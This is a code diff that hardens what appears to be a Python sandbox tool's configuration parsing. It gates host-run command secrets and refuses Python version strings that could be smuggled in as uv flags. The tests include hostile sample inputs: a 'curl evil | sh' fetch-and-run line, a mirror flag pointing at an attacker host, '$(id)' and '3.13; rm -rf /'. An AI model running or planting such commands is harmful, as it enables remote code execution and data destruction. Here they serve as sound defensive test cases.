@@ -104,6 +104,17 @@ pub struct EnvSection {
     pub image: Option<String>,
     /// Absolute path to the `uv` binary, when it is not on `PATH`.
     pub uv: Option<String>,
+    /// Permit secret sources that run host code **outside the sandbox**
+    /// (`source = "command:…"`).
+    ///
+    /// Off by default, and separate from the secret declaration itself,
+    /// because it is the single most dangerous line this file can contain: the
+    /// command runs unconfined, with your full environment. h5i gates it for
+    /// the same reason; senv used to enable it implicitly whenever a
+    /// `command:` source appeared, which turned a deliberate escape hatch into
+    /// an automatic one. Turning it on is a widening change, so a package that
+    /// edits this file cannot turn it on quietly.
+    pub allow_command_secrets: bool,
 }
 
 #[derive(Debug, Clone, Deserialize, Serialize)]
@@ -245,8 +256,10 @@ impl Config {
         let text = fs::read_to_string(path)?;
         let cfg: Config = toml::from_str(&text).map_err(|e| {
             // toml's message already carries the line/column and a caret; the
-            // path prefix from SenvError::Config completes it.
-            SenvError::config(path, e.to_string())
+            // path prefix from SenvError::Config completes it. Sanitized
+            // because the message quotes the offending line, and this file is
+            // writable by code running under senv.
+            SenvError::config(path, crate::util::sanitize_multiline(&e.to_string()))
         })?;
         cfg.validate(path)?;
         Ok(cfg)
@@ -269,6 +282,26 @@ impl Config {
                          or plain uv if you do not want a boundary.",
                     ));
                 }
+            }
+        }
+
+        if let Some(python) = &self.env.python {
+            validate_python_request(python)
+                .map_err(|e| SenvError::config(path, format!("[env] python: {e}")))?;
+        }
+
+        for (name, s) in self.secrets.iter() {
+            let source = s.source.clone().unwrap_or_default();
+            if source.starts_with("command:") && !self.env.allow_command_secrets {
+                return Err(SenvError::config(
+                    path,
+                    format!(
+                        "[secrets.{name}] uses a command: source, which runs on the host \
+                         OUTSIDE the sandbox with your full environment. Set [env] \
+                         allow-command-secrets = true to permit that, or use env:/file: \
+                         instead (fail-closed)."
+                    ),
+                ));
             }
         }
 
@@ -376,6 +409,44 @@ pub fn validate_host_pattern(entry: &str) -> std::result::Result<(), String> {
     Ok(())
 }
 
+/// Check a requested Python version before it becomes a `uv` argument.
+///
+/// `.python-version` and `[env] python` are both attacker-writable (the run
+/// phase grants the project read-write), and the value is passed to
+/// `uv python install`. Without this, `--mirror https://evil` in that file
+/// becomes a uv flag and senv fetches an interpreter from wherever the
+/// attacker says. Anything that is not a version-shaped token is refused.
+pub fn validate_python_request(value: &str) -> std::result::Result<(), String> {
+    let value = value.trim();
+    if value.is_empty() {
+        return Err("is empty".to_string());
+    }
+    if value.len() > 64 {
+        return Err("is implausibly long for a version".to_string());
+    }
+    // Must start with a digit, so it can never be read as a flag. uv also
+    // accepts implementation-qualified requests like `cpython@3.13`, hence the
+    // permitted separators — none of which can begin the string.
+    if !value.starts_with(|c: char| c.is_ascii_digit()) {
+        return Err(format!(
+            "'{}' is not a version number. senv only accepts requests beginning with a digit \
+             (e.g. 3.13, 3.13.2), because this value becomes an argument to uv and a leading \
+             '-' would be read as a flag.",
+            crate::util::sanitize(value)
+        ));
+    }
+    if !value
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'+')
+    {
+        return Err(format!(
+            "'{}' contains characters a version does not",
+            crate::util::sanitize(value)
+        ));
+    }
+    Ok(())
+}
+
 /// Where `senv.toml` lives for a project root.
 pub fn config_path(root: &Path) -> PathBuf {
     root.join(CONFIG_FILE)
@@ -439,6 +510,46 @@ mod tests {
             err.to_string().contains("no unconfined execution path"),
             "{err}"
         );
+    }
+
+    #[test]
+    fn a_command_secret_needs_an_explicit_gate() {
+        // This was a working host-escape: a package writes a command: source
+        // into senv.toml and the broker runs it unconfined on the next run.
+        let err =
+            parse("[secrets.X]\nsource = \"command:curl evil | sh\"\n").expect_err("must refuse");
+        assert!(err.to_string().contains("OUTSIDE the sandbox"), "{err}");
+        assert!(err.to_string().contains("allow-command-secrets"), "{err}");
+
+        // With the gate set it parses — and `trust` treats setting the gate as
+        // a widening, so a package cannot set it quietly.
+        assert!(
+            parse("[env]\nallow-command-secrets = true\n[secrets.X]\nsource = \"command:x\"\n")
+                .is_ok()
+        );
+    }
+
+    #[test]
+    fn a_python_request_can_never_become_a_uv_flag() {
+        // `.python-version` and this key are attacker-writable and end up as
+        // argv for `uv python install`.
+        assert!(validate_python_request("3.13").is_ok());
+        assert!(validate_python_request("3.13.2").is_ok());
+        assert!(validate_python_request("3.13t").is_ok());
+        for hostile in [
+            "--mirror=https://evil",
+            "-h",
+            "",
+            "  ",
+            "$(id)",
+            "3.13; rm -rf /",
+        ] {
+            assert!(
+                validate_python_request(hostile).is_err(),
+                "accepted: {hostile:?}"
+            );
+        }
+        assert!(parse("[env]\npython = \"--mirror=https://evil\"\n").is_err());
     }
 
     #[test]
